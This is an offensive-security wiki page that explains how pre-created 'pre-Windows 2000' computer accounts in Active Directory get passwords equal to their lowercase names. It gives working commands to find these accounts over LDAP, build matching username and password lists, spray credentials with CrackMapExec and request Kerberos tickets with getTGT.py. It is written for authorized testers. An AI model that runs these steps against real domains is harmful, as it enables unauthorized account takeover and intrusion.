# Pre-Windows 2000 computers

## Theory

When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing `$`). When it isn't, the password is randomly generated.

Once an authentication occurs for a pre-Windows 2000 computer, according to [TrustedSec's blogpost](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/), its password will usually need to be changed.

## Practice

Finding computer accounts that have been "pre-created" (i.e. manually created in [ADUC](https://blog.netwrix.com/2017/01/30/active-directory-users-and-computers-aduc/) instead of automatically added when joining a machine to the domain), but have never been used can be done by filtering the `UserAccountControl` attribute of all computer accounts and look for the value 4128 (32|4096) (deductible via the [UserAccountControl](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) flags):

* 32 - `PASSWD_NOTREQD`
* 4096 - `WORKSTATION_TRUST_ACCOUNT`

The `logonCount` attribute can be filtered as well.

The [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) tool can be used to find such accounts. Once "pre-created" computer accounts that have not authenticated are found, they should be usable with their lowercase name set as their password. This can be tested with [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) (Python) for instance.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># 1. find pre-created accounts that never logged on
</strong><strong>ldapsearch-ad -l $LDAP_SERVER -d $DOMAIN -u $USERNAME -p $PASSWORD -t search -s '(&#x26;(userAccountControl=4128)(logonCount=0))' | tee results.txt
</strong>
# 2. extract the sAMAccountNames of the results
cat results.txt | grep "sAMAccountName" | awk '{print $4}' | tee computers.txt

# 3. create a wordlist of passwords matching the Pre-Windows 2000 generation, based on the account names
cat results.txt | grep "sAMAccountName" | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt

# 4. bruteforce, line per line (user1:password1, user2:password2, ...)
cme smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce</code></pre>

> You will see the error message **STATUS\_NOLOGON\_WORKSTATION\_TRUST\_ACCOUNT** when you have guessed the correct password for a computer account that has not been used yet. ([trustedsec.com](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/))

Testers can then change the Pre-Windows 2000 computer accounts' password (i.e. [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304), [kpasswd.py](https://github.com/SecureAuthCorp/impacket/pull/1189), etc.) in order to use it.

{% hint style="success" %}
Alternatively, Filip Dragovic was able to authenticate using Kerberos without having to change the account's password. ([source](https://twitter.com/filip\_dragovic/status/1524730451826511872))

```bash
getTGT.py $DOMAIN/$COMPUTER_NAME\$:$COMPUTER_PASSWORD
```

The ticket obtained can then be used with [ptt.md](../kerberos/ptt.md "mention")
{% endhint %}

## Reference

{% embed url="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/" %}

{% embed url="https://web.archive.org/web/20080205233505/http://support.microsoft.com/kb/320187" %}
